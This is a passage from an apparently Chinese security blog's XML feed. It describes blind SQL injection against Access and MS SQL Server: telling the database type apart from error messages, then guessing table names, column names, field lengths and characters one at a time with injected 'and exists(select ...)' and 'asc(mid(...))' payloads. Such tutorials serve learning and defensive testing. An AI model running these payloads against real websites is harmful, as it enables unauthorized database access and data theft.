server存在sysobjects，<br>所以如果是access，则返回 microsoft OLE DB Provider for ODBC Drivers 错误’80040e37’或者’数据库找不到输入表。<br>ms sqlServer会返回错误信息，Microsoft OLE DB Provider for SQL Server 错误’80040e37’/对象名’msysobjects’无效。<br><strong>猜数据库名：</strong> 注入点后面写 and exists(select * from 数据库表名)或者and (select count(<em>) from 数据库表名) &gt; 0 这样一直更换常见表名进行查询。<br>*</em>猜字段名** 注入点后面写 and exists(select 字段名 from 数据库表名)或者 and (select count(字段名) from 表名)，也是一直更换常见表名。<br><strong>猜字段长度</strong> and (select top 1 len(字段名) from 表名) &gt; 2<br><strong>猜字段ASCII码值</strong> 注入点后面写 and (select top1 asc(mid(字段名,1,1)) from 表名) &gt;0 … n 当 &gt; n-1时正常，到n时出错，说明ASCII码已找到，然后得到字段的第一个字符。再使用and(select top 1 asc(mid(字段名,2,1)) from 表名 ) &gt; 0…寻找第二个字符。。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;MSF学习&quot;&gt;&lt;a href=&quot;#MSF学习&quot; class=&quot;headerlink&quot; title=&quot;MSF学习&quot;&gt;&lt;/a&gt;MSF学习&lt;/h2&gt;&lt;h3 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环
      
    
    </summary>
    
    
    
  </entry>
  
</feed>
